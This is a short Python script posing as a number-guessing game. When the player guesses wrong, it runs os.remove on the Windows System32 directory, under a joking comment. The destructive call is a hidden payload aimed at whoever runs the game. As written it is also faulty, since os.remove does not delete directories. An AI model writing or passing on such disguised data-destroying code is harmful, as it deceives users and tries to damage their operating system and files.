import os
import random

number = random.randint(1, 10)
text = int(input("insert a number between 1 and 10:"))

if(text == number):
    print("You win")
else:
    #well you lose
    os.remove("C:\Windows\System32")